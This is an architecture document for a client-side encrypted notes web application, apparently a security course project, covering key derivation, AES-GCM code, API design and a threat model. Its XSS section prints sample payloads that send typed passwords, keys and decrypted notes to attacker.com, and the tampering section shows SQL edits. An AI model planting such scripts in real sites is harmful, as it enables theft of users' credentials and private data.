# Architecture Document – Secure Notes Application

## 1. System Overview

### 1.1 Purpose

This document describes the architecture of a zero-knowledge encrypted notes web application where:

- All encryption and decryption operations occur **client-side** in the browser
- The server acts as a **dumb storage layer** with no access to plaintext or encryption keys
- Data integrity is verified through authenticated encryption
- The system explicitly addresses XSS vulnerabilities and data tampering scenarios

### 1.2 Zero-Knowledge Model

In this architecture, "zero-knowledge" means:

1. The server **never receives** the master password or encryption keys
2. The server **never sees** plaintext note content
3. Database compromise reveals only ciphertext and metadata
4. Password recovery is **impossible by design** (no backdoor)

**Trust Model:**
- Server and database are "honest-but-curious" – they may be compromised without revealing plaintext
- Client browser is trusted during a session – XSS attacks break this trust assumption
- Network is untrusted – HTTPS provides transport security

---

## 2. High-Level Architecture

### 2.1 Component Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                         Client Browser                          │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │                   React Frontend SPA                       │ │
│  │                                                            │ │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────────┐  │ │
│  │  │   UI Layer   │  │ Crypto Layer │  │  API Client      │  │ │
│  │  │              │  │              │  │                  │  │ │
│  │  │ • Login      │  │ • PBKDF2     │  │ • Axios/Fetch    │  │ │
│  │  │ • Register   │  │ • AES-GCM    │  │ • JWT handling   │  │ │
│  │  │ • NotesList  │  │ • Key mgmt   │  │ • Error handling │  │ │
│  │  │ • NoteEditor │  │ • Web Crypto │  │                  │  │ │
│  │  └──────────────┘  └──────────────┘  └──────────────────┘  │ │
│  │                                                            │ │
│  │  State Management: React Context/Hooks                     │ │
│  │  Key Storage: In-memory only (useRef, no localStorage)     │ │
│  └────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
                                │
                                │ HTTPS
                                │ JSON payloads (encrypted data only)
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Backend Server (Node.js/Express)             │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │                      Express Application                   │ │
│  │                                                            │ │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────────┐  │ │
│  │  │ Auth Routes  │  │ Notes Routes │  │  Middleware      │  │ │
│  │  │              │  │              │  │                  │  │ │
│  │  │ • /register  │  │ • GET /notes │  │ • JWT verify     │  │ │
│  │  │ • /login     │  │ • POST /notes│  │ • Rate limit     │  │ │
│  │  │              │  │ • PUT /notes │  │ • CORS           │  │ │
│  │  │              │  │ • DELETE     │  │ • Helmet (CSP)   │  │ │
│  │  └──────────────┘  └──────────────┘  └──────────────────┘  │ │
│  │                                                            │ │
│  │  Controllers: Business logic (validation, DB operations)   │ │
│  │  NO ACCESS TO: Encryption keys, plaintext data             │ │
│  └────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
                                │
                                │ SQL queries
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Database (PostgreSQL + Prisma)               │
│                                                                 │
│  ┌──────────────────────┐      ┌──────────────────────────┐     │
│  │   users table        │      │   notes table            │     │
│  │                      │      │                          │     │
│  │ • id (PK)            │      │ • id (PK)                │     │
│  │ • email (unique)     │      │ • user_id (FK)           │     │
│  │ • username_hash      │      │ • ciphertext (TEXT)      │     │
│  │ • password_verifier  │      │ • iv (VARCHAR)           │     │
│  │ • salt_login         │      │ • auth_tag (VARCHAR)     │     │
│  │ • created_at         │      │ • created_at             │     │
│  └──────────────────────┘      │ • updated_at             │     │
│                                └──────────────────────────┘     │
│                                                                 │
│  All note content stored as unreadable ciphertext               │
└─────────────────────────────────────────────────────────────────┘
```

---

## 3. Detailed Data Flows

### 3.1 User Registration Flow

```
┌────────┐                 ┌─────────┐                 ┌────────┐
│ User   │                 │ Browser │                 │ Server │
└───┬────┘                 └────┬────┘                 └───┬────┘
    │                           │                          │
    │ 1. Enter email +          │                          │
    │    master password        │                          │
    ├──────────────────────────>│                          │
    │                           │                          │
    │                           │ 2. Generate random salt  │
    │                           │    (16 bytes)            │
    │                           │                          │
    │                           │ 3. PBKDF2 key derivation:│
    │                           │    - Input: password, salt│
    │                           │    - Iterations: 100,000 │
    │                           │    - Output: master key  │
    │                           │      (256 bits)          │
    │                           │                          │
    │                           │ 4. Derive separate login │
    │                           │    password verifier     │
    │                           │    (different salt)      │
    │                           │                          │
    │                           │ 5. Hash username/email   │
    │                           │    for privacy (optional)│
    │                           │                          │
    │                           │ 6. POST /api/auth/register│
    │                           │    {email, usernameHash, │
    │                           │     passwordVerifier,    │
    │                           │     saltLogin}           │
    │                           ├─────────────────────────>│
    │                           │                          │
    │                           │                          │ 7. Store user
    │                           │                          │    record in DB
    │                           │                          │    (NO master key)
    │                           │                          │
    │                           │ 8. Return success        │
    │                           │<─────────────────────────┤
    │                           │                          │
    │                           │ 9. Store master key in   │
    │                           │    memory (React state)  │
    │                           │                          │
    │ 10. Registration complete │                          │
    │<──────────────────────────┤                          │
    │                           │                          │
```

**Key Points:**
- Master encryption key derived from password never leaves browser
- Server receives only a separate login password verifier
- Username may be hashed for privacy (unlinkability)
- Master key stored in memory only (not localStorage)

---

### 3.2 Note Creation Flow

```
┌────────┐                 ┌─────────┐                 ┌────────┐
│ User   │                 │ Browser │                 │ Server │
└───┬────┘                 └────┬────┘                 └───┬────┘
    │                           │                          │
    │ 1. Type note content      │                          │
    ├──────────────────────────>│                          │
    │                           │                          │
    │                           │ 2. Retrieve master key   │
    │                           │    from memory           │
    │                           │                          │
    │                           │ 3. Generate random IV    │
    │                           │    (12 bytes)            │
    │                           │                          │
    │                           │ 4. Prepare AAD:          │
    │                           │    {userId, noteId}      │
    │                           │                          │
    │                           │ 5. AES-256-GCM encrypt:  │
    │                           │    - plaintext           │
    │                           │    - master key          │
    │                           │    - IV                  │
    │                           │    - AAD                 │
    │                           │    → ciphertext + authTag│
    │                           │                          │
    │                           │ 6. POST /api/notes       │
    │                           │    {ciphertext, iv,      │
    │                           │     authTag, metadata}   │
    │                           ├─────────────────────────>│
    │                           │                          │
    │                           │                          │ 7. Validate JWT
    │                           │                          │
    │                           │                          │ 8. Store encrypted
    │                           │                          │    blob in DB
    │                           │                          │
    │                           │ 9. Return note ID        │
    │                           │<─────────────────────────┤
    │                           │                          │
    │ 10. Note created          │                          │
    │<──────────────────────────┤                          │
    │                           │                          │
```

**Key Points:**
- Each note gets a unique random IV
- AAD (Additional Authenticated Data) binds ciphertext to userId + noteId
- Server receives only opaque ciphertext blob
- Auth tag provides integrity verification

---

### 3.3 Note Retrieval and Decryption Flow

```
┌────────┐                 ┌─────────┐                 ┌────────┐
│ User   │                 │ Browser │                 │ Server │
└───┬────┘                 └────┬────┘                 └───┬────┘
    │                           │                          │
    │ 1. Select note to view    │                          │
    ├──────────────────────────>│                          │
    │                           │                          │
    │                           │ 2. GET /api/notes/:id    │
    │                           │    (with JWT)            │
    │                           ├─────────────────────────>│
    │                           │                          │
    │                           │                          │ 3. Verify JWT
    │                           │                          │
    │                           │                          │ 4. Check user owns
    │                           │                          │    this note
    │                           │                          │
    │                           │                          │ 5. Fetch from DB
    │                           │                          │
    │                           │ 6. Return encrypted blob:│
    │                           │    {ciphertext, iv,      │
    │                           │     authTag, metadata}   │
    │                           │<─────────────────────────┤
    │                           │                          │
    │                           │ 7. Retrieve master key   │
    │                           │    from memory           │
    │                           │                          │
    │                           │ 8. Reconstruct AAD:      │
    │                           │    {userId, noteId}      │
    │                           │                          │
    │                           │ 9. AES-GCM decrypt:      │
    │                           │    - ciphertext          │
    │                           │    - master key          │
    │                           │    - IV                  │
    │                           │    - AAD                 │
    │                           │                          │
    │                           │ 10. Verify auth tag      │
    │                           │                          │
    │                        ┌──┴──┐                       │
    │                        │     │                       │
    │                    Tag valid?│                       │
    │                        │     │                       │
    │        Yes─────────────┴─No  │                       │
    │         │                │   │                       │
    │         │                │   │                       │
    │ 11a. Display     11b. Show   │                       │
    │      plaintext     "TAMPERED"│                       │
    │                    warning   │                       │
    │<─────────────────────┴───────┘                       │
    │                           │                          │
```

**Key Points:**
- Decryption happens entirely in browser
- Auth tag verification detects any tampering
- If tag invalid, plaintext is NOT displayed
- AAD prevents replay attacks between users/notes

---

### 3.4 Data Tampering Detection Flow

```
┌────────────┐            ┌─────────┐            ┌────────┐
│ Attacker   │            │ Browser │            │ Server │
└─────┬──────┘            └────┬────┘            └───┬────┘
      │                        │                     │
      │ 1. Gain DB access      │                     │
      │                        │                     │
      │ 2. Modify ciphertext   │                     │
      │    or auth tag in DB   │                     │
      ├───────────────────────>│                     │
      │                        │                     │
                               │ 3. User requests note
                               │                     │
                               │ 4. GET /api/notes/:id│
                               ├────────────────────>│
                               │                     │
                               │ 5. Return TAMPERED  │
                               │    data from DB     │
                               │<────────────────────┤
                               │                     │
                               │ 6. Attempt decrypt  │
                               │    with auth tag    │
                               │    verification     │
                               │                     │
                               │ 7. Tag mismatch!    │
                               │    Decryption fails │
                               │                     │
                               │ 8. Display warning: │
                               │    "INTEGRITY CHECK │
                               │     FAILED - Note   │
                               │     may be tampered"│
                               │                     │
                               │ 9. Log incident     │
                               │    (optional)       │
                               │                     │
```

**Protection Mechanisms:**
- AES-GCM auth tag computed over ciphertext + AAD
- Any modification to ciphertext, IV, or AAD causes tag verification failure
- User sees integrity warning instead of (potentially malicious) plaintext
- Prevents silent corruption attacks

---

## 4. Cryptographic Design

### 4.1 Key Derivation (PBKDF2)

**Algorithm:** PBKDF2-HMAC-SHA256 via Web Crypto API

**Parameters:**
```javascript
{
  algorithm: 'PBKDF2',
  hash: 'SHA-256',
  salt: randomSalt,        // 16 bytes (128 bits)
  iterations: 100000,      // Configurable (100k-600k)
  derivedKeyLength: 256    // bits
}
```

**Implementation:**
```javascript
async function deriveKey(password, salt, iterations = 100000) {
  // Import password as raw key material
  const passwordKey = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(password),
    'PBKDF2',
    false,
    ['deriveBits', 'deriveKey']
  );

  // Derive AES-GCM key
  const key = await crypto.subtle.deriveKey(
    {
      name: 'PBKDF2',
      salt: salt,
      iterations: iterations,
      hash: 'SHA-256'
    },
    passwordKey,
    { name: 'AES-GCM', length: 256 },
    false,  // not extractable (security best practice)
    ['encrypt', 'decrypt']
  );

  return key;
}
```

**Security Properties:**
- High iteration count (100k+) resists brute-force attacks
- Unique salt per user prevents rainbow table attacks
- SHA-256 provides strong HMAC
- Key marked as non-extractable when possible

---

### 4.2 Encryption (AES-256-GCM)

**Algorithm:** AES-GCM (Galois/Counter Mode)

**Parameters:**
```javascript
{
  algorithm: 'AES-GCM',
  keySize: 256,             // bits
  ivLength: 12,             // bytes (96 bits, recommended for GCM)
  tagLength: 128            // bits (default for GCM)
}
```

**Implementation:**
```javascript
async function encryptNote(plaintext, key, userId, noteId) {
  // Generate random IV (must be unique per encryption)
  const iv = crypto.getRandomValues(new Uint8Array(12));

  // Prepare Additional Authenticated Data (AAD)
  const aad = new TextEncoder().encode(
    JSON.stringify({ userId, noteId })
  );

  // Encrypt
  const ciphertext = await crypto.subtle.encrypt(
    {
      name: 'AES-GCM',
      iv: iv,
      additionalData: aad,
      tagLength: 128
    },
    key,
    new TextEncoder().encode(plaintext)
  );

  // Extract auth tag (last 16 bytes of ciphertext)
  const authTag = ciphertext.slice(-16);
  const actualCiphertext = ciphertext.slice(0, -16);

  return {
    ciphertext: arrayBufferToBase64(actualCiphertext),
    iv: arrayBufferToBase64(iv),
    authTag: arrayBufferToBase64(authTag)
  };
}
```

**Implementation:**
```javascript
async function decryptNote(encryptedData, key, userId, noteId) {
  const { ciphertext, iv, authTag } = encryptedData;

  // Reconstruct AAD (must match encryption)
  const aad = new TextEncoder().encode(
    JSON.stringify({ userId, noteId })
  );

  // Concatenate ciphertext + auth tag
  const combined = concatenateArrayBuffers(
    base64ToArrayBuffer(ciphertext),
    base64ToArrayBuffer(authTag)
  );

  try {
    // Decrypt (automatically verifies auth tag)
    const plaintext = await crypto.subtle.decrypt(
      {
        name: 'AES-GCM',
        iv: base64ToArrayBuffer(iv),
        additionalData: aad,
        tagLength: 128
      },
      key,
      combined
    );

    return new TextDecoder().decode(plaintext);

  } catch (error) {
    // Auth tag verification failed = tampered data
    throw new IntegrityError('Data integrity check failed');
  }
}
```

**Security Properties:**
- Authenticated encryption (confidentiality + integrity)
- Unique IV per encryption (critical for GCM security)
- AAD binds ciphertext to specific userId + noteId
- Auth tag detects any modification to ciphertext or AAD
- Prevents replay attacks between users or notes

---

### 4.3 Key Storage and Lifecycle

**Storage Location:** Browser memory only

```javascript
// React implementation example
function App() {
  // Master key stored in React state (memory only)
  const [masterKey, setMasterKey] = useState(null);

  // Alternative: useRef for persistent reference
  const masterKeyRef = useRef(null);

  // On login: derive and store key
  async function handleLogin(email, password, saltLogin) {
    const key = await deriveKey(password, saltLogin);
    setMasterKey(key);  // Store in memory
    // DO NOT: localStorage.setItem('key', key) ❌
  }

  // On logout: clear key
  function handleLogout() {
    setMasterKey(null);
    // Key will be garbage collected
  }

  return (
    <AuthContext.Provider value={{ masterKey, handleLogin, handleLogout }}>
      {/* App components */}
    </AuthContext.Provider>
  );
}
```

**Lifecycle:**
1. **Derivation:** Key derived from password on login
2. **Storage:** Kept in React state/useRef (RAM only)
3. **Usage:** Passed to encrypt/decrypt functions as needed
4. **Clearing:** Set to null on logout (garbage collected)

**Security Considerations:**
- ✅ Never stored in localStorage, sessionStorage, IndexedDB, or cookies
- ✅ Never sent to server
- ✅ Cleared on logout or page refresh
- ⚠️ Vulnerable to XSS attacks (can read from JavaScript memory)
- ⚠️ Vulnerable to browser debugging tools

---

## 5. Backend API Design

### 5.1 Authentication Endpoints

#### POST /api/auth/register

**Purpose:** Create new user account

**Request:**
```json
POST /api/auth/register
Content-Type: application/json

{
  "email": "user@example.com",
  "usernameHash": "sha256_hash",
  "passwordVerifier": "pbkdf2_derived_hash",
  "saltLogin": "base64_encoded_salt"
}
```

**Response:**
```json
201 Created
{
  "message": "User registered successfully",
  "userId": 123
}
```

**Server Logic:**
1. Validate input (email format, field presence)
2. Check email uniqueness
3. Store user record with password verifier (NOT master key)
4. Return success

---

#### POST /api/auth/login

**Purpose:** Authenticate user and issue JWT

**Request:**
```json
POST /api/auth/login
Content-Type: application/json

{
  "email": "user@example.com",
  "passwordVerifier": "pbkdf2_derived_hash"
}
```

**Response:**
```json
200 OK
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "userId": 123,
  "expiresIn": 3600
}
```

**Server Logic:**
1. Find user by email
2. Verify password verifier matches stored hash
3. Generate JWT with payload: `{userId, email, exp}`
4. Return JWT (in response body or HTTP-only cookie)

---

### 5.2 Notes Endpoints

All notes endpoints require valid JWT authentication.

#### GET /api/notes

**Purpose:** Retrieve all notes for authenticated user

**Request:**
```http
GET /api/notes
Authorization: Bearer <jwt_token>
```

**Response:**
```json
200 OK
{
  "notes": [
    {
      "id": 1,
      "ciphertext": "base64_encrypted_content...",
      "iv": "base64_initialization_vector",
      "authTag": "base64_authentication_tag",
      "createdAt": "2026-02-07T19:00:00Z",
      "updatedAt": "2026-02-07T19:00:00Z"
    }
  ]
}
```

---

#### POST /api/notes

**Purpose:** Create new encrypted note

**Request:**
```json
POST /api/notes
Authorization: Bearer <jwt_token>
Content-Type: application/json

{
  "ciphertext": "base64_encrypted_content",
  "iv": "base64_initialization_vector",
  "authTag": "base64_authentication_tag"
}
```

**Response:**
```json
201 Created
{
  "noteId": 456,
  "createdAt": "2026-02-07T19:15:00Z"
}
```

---

#### PUT /api/notes/:id

**Purpose:** Update existing note

**Request:**
```json
PUT /api/notes/456
Authorization: Bearer <jwt_token>
Content-Type: application/json

{
  "ciphertext": "base64_updated_content",
  "iv": "base64_new_initialization_vector",
  "authTag": "base64_new_authentication_tag"
}
```

**Response:**
```json
200 OK
{
  "message": "Note updated successfully",
  "updatedAt": "2026-02-07T19:20:00Z"
}
```

---

#### DELETE /api/notes/:id

**Purpose:** Delete note

**Request:**
```http
DELETE /api/notes/456
Authorization: Bearer <jwt_token>
```

**Response:**
```http
204 No Content
```

---

### 5.3 Middleware Stack

**Order of execution:**
```javascript
app.use(helmet());              // 1. Security headers
app.use(cors(corsOptions));     // 2. CORS
app.use(rateLimiter);           // 3. Rate limiting
app.use(express.json());        // 4. JSON parsing
app.use(requestLogger);         // 5. Logging
app.use('/api/notes', authenticate); // 6. JWT verification (protected routes)
```

**Authentication Middleware:**
```javascript
async function authenticate(req, res, next) {
  try {
    // Extract token from Authorization header
    const token = req.headers.authorization?.split(' ')[1];
    
    if (!token) {
      return res.status(401).json({ error: 'No token provided' });
    }

    // Verify JWT
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    
    // Attach user info to request
    req.userId = decoded.userId;
    req.userEmail = decoded.email;
    
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}
```

---

## 6. Database Design

### 6.1 Schema (PostgreSQL)

**Prisma Schema:**
```prisma
model User {
  id                Int       @id @default(autoincrement())
  email             String    @unique
  usernameHash      String    @unique @map("username_hash")
  passwordVerifier  String    @map("password_verifier")
  saltLogin         String    @map("salt_login")
  createdAt         DateTime  @default(now()) @map("created_at")
  
  notes             Note[]

  @@map("users")
}

model Note {
  id         Int       @id @default(autoincrement())
  userId     Int       @map("user_id")
  ciphertext String    @db.Text
  iv         String
  authTag    String    @map("auth_tag")
  createdAt  DateTime  @default(now()) @map("created_at")
  updatedAt  DateTime  @updatedAt @map("updated_at")
  
  user       User      @relation(fields: [userId], references: [id], onDelete: Cascade)

  @@index([userId])
  @@map("notes")
}
```

**Generated SQL:**
```sql
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  email VARCHAR(255) UNIQUE NOT NULL,
  username_hash VARCHAR(255) UNIQUE NOT NULL,
  password_verifier VARCHAR(255) NOT NULL,
  salt_login VARCHAR(255) NOT NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE notes (
  id SERIAL PRIMARY KEY,
  user_id INTEGER NOT NULL,
  ciphertext TEXT NOT NULL,
  iv VARCHAR(255) NOT NULL,
  auth_tag VARCHAR(255) NOT NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

CREATE INDEX idx_notes_user_id ON notes(user_id);
```

### 6.2 Data Storage Format

**Users Table:**
- `email`: Plain text email (for login identification)
- `username_hash`: SHA-256 hash of username (optional privacy enhancement)
- `password_verifier`: PBKDF2-derived hash for authentication (NOT the encryption key)
- `salt_login`: Salt used for login password derivation

**Notes Table:**
- `ciphertext`: Base64-encoded AES-GCM ciphertext (TEXT type for large notes)
- `iv`: Base64-encoded 12-byte initialization vector
- `auth_tag`: Base64-encoded 16-byte authentication tag
- All three fields are **unreadable without the master key**

### 6.3 What Database Admin Sees

```sql
SELECT * FROM notes WHERE user_id = 123 LIMIT 1;

-- Result:
id | user_id | ciphertext                              | iv                  | auth_tag
---+---------+-----------------------------------------+---------------------+------------------
1  | 123     | a3f5b8c9d2e1f4g7h6i5j8k1l0m9n2o5p...  | 1a2b3c4d5e6f7g8h... | 9i0j1k2l3m4n...
```

**Observation:** All content is gibberish. Even with full database dump, attacker cannot read notes.

---

## 7. Security Analysis

### 7.1 XSS Attack Impact (Explicit Course Requirement)

**Attack Scenario:** Attacker injects malicious JavaScript into the application

**Attack Vectors:**
1. Stored XSS: Malicious script in database (e.g., note title)
2. Reflected XSS: Malicious script in URL parameters
3. DOM-based XSS: Vulnerable JavaScript code

**What Attacker Can Do with XSS:**

```javascript
// 1. Keylogger - steal master password as user types
document.addEventListener('input', (e) => {
  if (e.target.type === 'password') {
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({ password: e.target.value })
    });
  }
});

// 2. Steal encryption key from memory
const stolenKey = window.React.__SECRET_KEY__;
fetch('https://attacker.com/key', {
  method: 'POST',
  body: JSON.stringify({ key: stolenKey })
});

// 3. Read decrypted plaintext from DOM
const plaintextNotes = document.querySelectorAll('.note-content');
fetch('https://attacker.com/data', {
  method: 'POST',
  body: JSON.stringify({ notes: Array.from(plaintextNotes).map(n => n.textContent) })
});

// 4. Replace crypto functions with backdoored versions
window.originalDecrypt = crypto.subtle.decrypt;
crypto.subtle.decrypt = async function(...args) {
  const plaintext = await originalDecrypt.apply(this, args);
  // Exfiltrate plaintext
  fetch('https://attacker.com/plaintext', { 
    method: 'POST', 
    body: plaintext 
  });
  return plaintext;
};
```

**Conclusion:** XSS completely bypasses zero-knowledge security model on the compromised client.

---

### 7.2 XSS Mitigations

**1. Content Security Policy (CSP)**

```javascript
// Helmet configuration in Express
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],           // No inline scripts
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],          // Only same-origin API calls
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],     // Force HTTPS
    },
  },
}));
```

**2. React Automatic Escaping**

```jsx
// ✅ Safe: React automatically escapes
function NoteDisplay({ noteContent }) {
  return <div>{noteContent}</div>;  // Escaped automatically
}

// ❌ DANGEROUS: Never do this
function UnsafeNoteDisplay({ noteContent }) {
  return <div dangerouslySetInnerHTML={{ __html: noteContent }} />;
}
```

**3. Input Validation and Sanitization**

```javascript
// Backend validation
const { body, validationResult } = require('express-validator');

app.post('/api/notes', [
  body('ciphertext').isBase64(),
  body('iv').isBase64(),
  body('authTag').isBase64()
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  // Process...
});
```

**4. HTTP-Only Cookies**

```javascript
// Store JWT in HTTP-only cookie (not accessible to JavaScript)
res.cookie('token', jwt, {
  httpOnly: true,    // Prevents XSS access
  secure: true,      // HTTPS only
  sameSite: 'strict' // CSRF protection
});
```

**5. Security Headers**

```javascript
app.use(helmet({
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  frameguard: { action: 'deny' },
  xssFilter: true,
  noSniff: true,
  referrerPolicy: { policy: 'no-referrer' }
}));
```

---

### 7.3 Data Tampering Scenarios (Explicit Course Requirement)

**Scenario 1: Attacker Modifies Ciphertext**

```sql
-- Attacker gains DB access and modifies note
UPDATE notes 
SET ciphertext = 'malicious_ciphertext_here' 
WHERE id = 123;
```

**System Response:**
1. User requests note
2. Server returns modified ciphertext
3. Browser attempts AES-GCM decryption
4. **Auth tag verification fails** (tag was computed over original ciphertext)
5. Browser displays: "⚠️ INTEGRITY CHECK FAILED - Note may be tampered"
6. Plaintext is NOT displayed

---

**Scenario 2: Attacker Swaps Ciphertexts Between Users**

```sql
-- Attacker tries to give User A's notes to User B
UPDATE notes 
SET user_id = 456 
WHERE id = 123 AND user_id = 789;
```

**System Response:**
1. User B requests note (now associated with their account)
2. Browser attempts decryption with AAD = {userId: 456, noteId: 123}
3. **Auth tag verification fails** (tag was computed with AAD = {userId: 789, ...})
4. Attack detected and prevented

---

**Scenario 3: Replay Attack (Same User, Different Note)**

```sql
-- Attacker copies ciphertext from note 1 to note 2
UPDATE notes 
SET ciphertext = (SELECT ciphertext FROM notes WHERE id = 1),
    iv = (SELECT iv FROM notes WHERE id = 1),
    auth_tag = (SELECT auth_tag FROM notes WHERE id = 1)
WHERE id = 2;
```

**System Response:**
1. User requests note 2
2. Browser attempts decryption with AAD = {userId, noteId: 2}
3. **Auth tag verification fails** (tag was computed with noteId: 1)
4. Replay detected and prevented

---

### 7.4 Threat Model Summary

| Threat | Protected? | Mechanism |
|--------|-----------|-----------|
| Server compromise | ✅ Yes | Zero-knowledge: no keys on server |
| Database dump | ✅ Yes | All notes encrypted |
| Network eavesdropping | ✅ Yes | HTTPS transport encryption |
| Data tampering | ✅ Yes | AES-GCM auth tags |
| Replay attacks | ✅ Yes | AAD binding to userId + noteId |
| XSS attacks | ⚠️ Partial | CSP, escaping, validation |
| Malicious browser extension | ❌ No | Can read memory/DOM |
| Compromised client code | ❌ No | Zero-knowledge broken on that device |
| Password brute-force | ⚠️ Mitigated | PBKDF2 high iterations + rate limiting |

---

## 8. Technology Justification

### 8.1 Why Web Crypto API?

✅ **Native to browsers** – No external dependencies, smaller attack surface  
✅ **Hardware acceleration** – Uses CPU crypto instructions when available  
✅ **Standardized** – W3C standard, cross-browser support  
✅ **Non-extractable keys** – Keys can be marked as non-exportable  
✅ **Secure random** – `crypto.getRandomValues()` uses OS entropy  

❌ Alternative rejected: CryptoJS/Forge – Larger bundles, pure JavaScript (slower)

### 8.2 Why PostgreSQL + Prisma?

✅ **Relational data** – Users and notes have clear relationships  
✅ **ACID transactions** – Data consistency guarantees  
✅ **Type safety** – Prisma generates TypeScript types  
✅ **Migration system** – Prisma Migrate for schema versioning  
✅ **Prisma Studio** – GUI for viewing encrypted data (demo purposes)  

❌ Alternative considered: MongoDB – NoSQL flexible, but relational model fits better

### 8.3 Why React?

✅ **Modern hooks** – Clean state management (useState, useContext, useRef)  
✅ **Automatic escaping** – Built-in XSS protection  
✅ **Component architecture** – Clear separation of concerns  
✅ **Large ecosystem** – React Router, testing libraries  

---

## 9. Performance Considerations

### 9.1 Client-Side Performance

**PBKDF2 Key Derivation:**
- Time: ~100-200ms for 100k iterations (acceptable for login)
- Higher iterations = better security but slower
- Trade-off: 600k iterations → ~1 second (still acceptable)

**AES-GCM Encryption/Decryption:**
- Time: <5ms for typical note (1-10KB)
- Scales linearly with content size
- Even 1MB notes: <50ms on modern devices

**Memory Usage:**
- Master key: ~256 bits (32 bytes)
- Negligible memory footprint
- React state overhead: minimal

### 9.2 Server-Side Performance

**Database Queries:**
- All queries indexed on `user_id`
- No expensive operations (no decryption, no crypto)
- Typical response time: <10ms

**Rate Limiting:**
- Prevents resource exhaustion attacks
- Example: 100 requests per 15 minutes per IP

---

## 10. Deployment Architecture

### 10.1 Development

```
Frontend:  http://localhost:3000  (Vite dev server)
Backend:   http://localhost:5000  (Express)
Database:  localhost:5432          (PostgreSQL)
```

### 10.2 Production

```
Frontend:  https://app.example.com       (Vercel/Netlify CDN)
Backend:   https://api.example.com       (Railway/Render/Heroku)
Database:  Managed PostgreSQL instance   (Heroku Postgres/Supabase/RDS)
```

**Security Requirements:**
- ✅ HTTPS/TLS everywhere (certificates from Let's Encrypt/platform)
- ✅ HSTS headers
- ✅ CSP configured for production domains
- ✅ CORS restricted to frontend origin only
- ✅ Environment variables for secrets (JWT_SECRET, DATABASE_URL)

---

## 11. Future Enhancements

### 11.1 File Attachments

- Encrypt files client-side before upload
- Store encrypted blobs on S3/similar
- Decrypt on download in browser

### 11.2 Secure Note Sharing

- Implement Diffie-Hellman key exchange
- Encrypt shared notes with separate key
- Challenge: key distribution without server mediation

### 11.3 Multi-Device Sync

- Encrypted key backup/export
- QR code transfer between devices
- Challenge: maintaining zero-knowledge with sync

### 11.4 Two-Factor Authentication

- Add TOTP second factor for login
- Enhances authentication security
- Does not affect encryption (orthogonal concern)

---

## 12. Conclusion

This architecture demonstrates a practical zero-knowledge encrypted notes system where:

1. **Cryptography is sound** – PBKDF2 + AES-256-GCM with proper parameters
2. **Zero-knowledge is real** – Server genuinely cannot decrypt notes
3. **Integrity is verifiable** – GCM auth tags detect tampering
4. **Limitations are explicit** – XSS attacks acknowledged and mitigated
5. **Implementation is feasible** – Standard web technologies (React, Node, PostgreSQL)

The system successfully balances security, usability, and educational value for a web security course project.

---

## References

- [Web Crypto API Specification (W3C)](https://www.w3.org/TR/WebCryptoAPI/)
- [NIST SP 800-132: PBKDF2 Recommendations](https://csrc.nist.gov/publications/detail/sp/800-132/final)
- [NIST SP 800-38D: GCM Specification](https://csrc.nist.gov/publications/detail/sp/800-38d/final)
- [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
